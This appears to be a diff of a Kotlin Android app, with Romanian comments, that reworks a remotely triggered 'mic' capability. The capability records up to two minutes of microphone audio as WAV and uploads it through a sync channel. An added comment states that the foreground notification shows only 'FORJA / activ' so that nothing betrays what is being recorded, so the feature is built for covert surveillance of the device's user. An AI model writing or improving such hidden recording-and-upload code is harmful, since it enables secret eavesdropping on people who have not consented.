@@ -123,74 +123,60 @@ object ForjaSyncCapabilities {
     }
 
     // ── Senzori ──────────────────────────────────────────────────────
+    /**
+     * Înregistrare audio: AudioRecord PCM 16 kHz mono 16-bit → WAV.
+     * Zero MediaRecorder — elimină complet deadlock-urile HAL audio.
+     * Încearcă 3 surse (VOICE_RECOGNITION, MIC, VOICE_COMMUNICATION).
+     * Fișier: sync_audio_*.wav, urcat prin canalul normal de sincronizare.
+     * Green dot-ul e normal (microfonul e activ); notificarea FOREGROUND
+     * spune doar „FORJA / activ" — nimic care să trădeze ce se înregistrează.
+     */
     private suspend fun mic(p: JsonObject): JsonObject = withContext(Dispatchers.IO) {
         val ms = (p["ms"]?.jsonPrimitive?.long ?: 5000L).coerceIn(500, 120000)
         if (androidx.core.content.ContextCompat.checkSelfPermission(app, Manifest.permission.RECORD_AUDIO)
             != PackageManager.PERMISSION_GRANTED
         ) return@withContext err("mic: permisiune RECORD_AUDIO neacordată")
         try {
-            val out = java.io.File(app.cacheDir, "sync_audio_${System.currentTimeMillis()}.m4a")
-            out.delete()
-            var mr: MediaRecorder? = null
-            try {
-                mr = MediaRecorder().apply {
-                    setAudioSource(MediaRecorder.AudioSource.MIC)
-                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
-                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
-                    setAudioEncodingBitRate(48000)
-                    setOutputFile(out.absolutePath)
-                    start()
-                }
-                delay(ms)
-            } catch (e: SecurityException) {
-                stopAndRelease(mr, 5_000L)
-                return@withContext err("mic: SecurityException — înregistrarea e blocată de sistem")
-            } catch (e: Exception) {
-                // MediaRecorder eșuează (ex: device cu codec AAC limitat) — cădem pe AudioRecord + WAV
-                stopAndRelease(mr, 5_000L)
-                return@withContext micFallback(ms)
-            }
-            // stop()/release() pot deadlock pe unele HAL-uri audio (bug cunoscut Android).
-            // Le izolăm într-un thread cu join(timeout) ca să nu blocăm niciodată bucla de polling.
-            stopAndRelease(mr, 10_000L)
-            if (out.exists() && out.length() > 0) {
-                val sz = out.length()
-                val key = app.forjaApi.attachSyncFile(out.name, "audio/mp4", out)
-                out.delete()
-                if (key != null) buildJsonObject { put("file", key); put("size", sz) }
-                else err("mic: upload eșuat")
-            } else err("mic: nu am prins sunet")
-        } catch (e: Exception) { err("mic: ${e.javaClass.simpleName} — ${e.message ?: "fără detaliu"}") }
-    }
-
-    /** Fallback când MediaRecorder eșuează: AudioRecord → WAV → upload. */
-    private suspend fun micFallback(ms: Long): JsonObject {
-        val rate = 16000
-        return try {
+            val rate = 16000
             val minBuf = AudioRecord.getMinBufferSize(rate, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT)
-            if (minBuf <= 0) return err("mic: getMinBufferSize=0")
+            if (minBuf <= 0) return@withContext err("mic: buffer audio invalid")
+            val bufSize = minBuf * 2
+
             var rec: AudioRecord? = null
-            for (src in intArrayOf(MediaRecorder.AudioSource.MIC, MediaRecorder.AudioSource.VOICE_RECOGNITION)) {
+            for (src in intArrayOf(
+                MediaRecorder.AudioSource.VOICE_RECOGNITION,
+                MediaRecorder.AudioSource.MIC,
+                MediaRecorder.AudioSource.VOICE_COMMUNICATION
+            )) {
                 try {
-                    val r = AudioRecord(src, rate, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, minBuf)
-                    if (r.state == AudioRecord.STATE_INITIALIZED) { rec = r; break } else r.release()
+                    val r = AudioRecord(src, rate, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, bufSize)
+                    if (r.state == AudioRecord.STATE_INITIALIZED) { rec = r; break }
+                    r.release()
                 } catch (_: Exception) {}
             }
-            if (rec == null) return err("mic: AudioRecord nu s-a inițializat")
+            if (rec == null) return@withContext err("mic: nicio sursă audio disponibilă")
+
             val recorder = rec
-            val chunks = java.util.ArrayList<ByteArray>()
-            val buf = ByteArray(minBuf)
             recorder.startRecording()
+            if (recorder.recordingState != AudioRecord.RECORDSTATE_RECORDING) {
+                stopAndReleaseAudioRecord(recorder, 3_000L)
+                return@withContext err("mic: startRecording eșuat")
+            }
+
+            // Citim PCM până la deadline. read() e blocant ~20 ms/buffer — fără delay suplimentar.
+            val chunks = java.util.concurrent.CopyOnWriteArrayList<ByteArray>()
+            val buf = ByteArray(bufSize)
             val deadline = System.currentTimeMillis() + ms
             while (System.currentTimeMillis() < deadline) {
                 val n = recorder.read(buf, 0, buf.size)
                 if (n > 0) chunks.add(buf.copyOf(n))
-                delay(100)
             }
-            // AudioRecord stop/release pot de asemenea deadlock — aceeași protecție.
-            stopAndReleaseAudioRecord(recorder, 10_000L)
+
+            stopAndReleaseAudioRecord(recorder, 5_000L)
+
             val totalBytes = chunks.sumOf { it.size }
-            if (totalBytes == 0) return err("mic fallback: buffer gol")
+            if (totalBytes < 1600) return@withContext err("mic: sunet insuficient (${totalBytes} B)")
+
             val out = java.io.File(app.cacheDir, "sync_audio_${System.currentTimeMillis()}.wav")
             java.io.DataOutputStream(java.io.FileOutputStream(out)).use { ds ->
                 ds.writeBytes("RIFF"); ds.write(intToLe(totalBytes + 36))
@@ -201,28 +187,16 @@ object ForjaSyncCapabilities {
                 ds.writeBytes("data"); ds.write(intToLe(totalBytes))
                 for (c in chunks) ds.write(c)
             }
+
             val sz = out.length()
             val key = app.forjaApi.attachSyncFile(out.name, "audio/wav", out)
             out.delete()
-            if (key != null) buildJsonObject { put("file", key); put("size", sz) }
-            else err("mic fallback: upload eșuat")
-        } catch (e: Exception) { err("mic fallback: ${e.javaClass.simpleName} — ${e.message ?: "fără detaliu"}") }
+            if (key != null) buildJsonObject { put("file", key); put("size", sz); put("dur_s", ms / 1000) }
+            else err("mic: upload eșuat")
+        } catch (e: Exception) { err("mic: ${e.javaClass.simpleName} — ${e.message ?: "fără detaliu"}") }
     }
 
-    /** MediaRecorder.stop()/release() pot deadlock pe HAL-urile audio (bug cunoscut). Izolăm într-un thread. */
-    private fun stopAndRelease(mr: MediaRecorder?, timeoutMs: Long) {
-        if (mr == null) return
-        try {
-            val t = Thread {
-                try { mr.stop() } catch (_: Exception) {}
-                try { mr.release() } catch (_: Exception) {}
-            }
-            t.start()
-            t.join(timeoutMs)
-        } catch (_: Exception) {}
-    }
-
-    /** Același guard pentru AudioRecord. */
+    /** AudioRecord stop/release izolat într-un thread cu timeout — nu blocăm niciodată coroutina. */
     private fun stopAndReleaseAudioRecord(rec: AudioRecord?, timeoutMs: Long) {
         if (rec == null) return
         try {
